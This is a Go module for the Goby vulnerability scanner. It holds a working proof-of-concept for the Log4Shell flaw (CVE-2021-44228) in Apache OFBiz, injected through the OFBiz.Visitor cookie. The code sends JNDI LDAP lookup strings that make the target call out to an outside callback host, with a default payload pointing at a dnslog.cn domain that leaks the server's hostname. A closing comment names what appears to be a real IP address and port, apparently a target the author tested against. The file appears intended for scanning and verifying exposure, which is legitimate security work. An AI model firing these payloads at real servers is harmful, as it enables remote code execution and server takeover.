package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache OFBiz Cookie request header log4j2 RCE vulnerability (CVE-2021-44228)",
    "Description": "<p>Apache OFBiz is an open source enterprise resource planning (ERP) system.</p><p>The Apache OFBiz Cookie request header has a log4shell RCE vulnerability. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Apache OFBiz",
    "Homepage": "https://github.com/apache/ofbiz-framework",
    "DisclosureDate": "2021-12-20",
    "Author": "keeeee",
    "FofaQuery": "(cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\"))",
    "GobyQuery": "(cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\"))",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/ofbiz-framework/releases/tag/release18.12.04\">https://github.com/apache/ofbiz-framework/releases/tag/release18.12.04</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p> ",
    "Translation": {
        "CN": {
            "Name": "Apache OFBiz Cookie 请求头 log4j2 命令执行漏洞（CVE-2021-44228）",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ],
            "Description": "<p>Apache OFBiz 是一个开源的企业资源规划 (ERP) 系统。<br></p><p>Apache OFBiz存在&nbsp;log4shell RCE 漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Product": "Apache OFBiz",
            "Recommendation": "<p>⼚商已发布解决方案，<span style=\"font-size: 16px;\">请升级至新版本</span>： <a href=\"https://github.com/apache/ofbiz-framework/releases/tag/release18.12.04\">https://github.com/apache/ofbiz-framework/releases/tag/release18.12.04</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "Apache OFBiz Cookie request header log4j2 RCE vulnerability (CVE-2021-44228)",
            "Product": "Apache OFBiz",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ],
            "Description": "<p>Apache OFBiz is an open source enterprise resource planning (ERP) system.</p><p>The Apache OFBiz Cookie request header has a log4shell RCE vulnerability. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/ofbiz-framework/releases/tag/release18.12.04\" target=\"_blank\">https://github.com/apache/ofbiz-framework/releases/tag/release18.12.04</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p> "
        }
    },
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        "https://github.com/apache/ofbiz-framework/commit/64a0b6e8d04b936f472b418cc8847c03b462d3a0",
        "https://github.com/apache/ofbiz-framework/commit/479e222bbb7ecb81fdbf123cc6cfcc10f8dbac4a"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "${jndi:ldap://${hostName}.xxx.dnslog.cn"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CVSSScore": "10.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Is0day": false,
    "PocId": "10245"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// Godserver
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodLDAPCheckURL("U", checkStr)
			cmd := fmt.Sprintf("${jndi:%s}", checkUrl)

			// get 请求：
			uri := "/webtools/control/main"
			cfg := httpclient.NewGetRequestConfig(uri)
			// post 请求：
			//uri := "/mifs/j_spring_security_check"
			//cfg := httpclient.NewPostRequestConfig(uri)
			//cfg.Data = `j_username=` + url.QueryEscape(cmd) + `&j_password=password&logincontext=employee`
			//
			cfg.Header.Store("Cookie", "OFBiz.Visitor="+cmd)
			//cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			//cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false

			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			}

			return godclient.PullExists(checkStr, time.Second*4)
			//return foeye.PullJNDExists("RequestCommon", randomHex, time.Second*7)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)

			uri2 := "/webtools/control/main"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie", "OFBiz.Visitor="+cmd)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
			}

			expResult.Output = "see your dnslog"
			expResult.Success = true
			return expResult
		},
	))
}

//https://117.240.173.163:8443
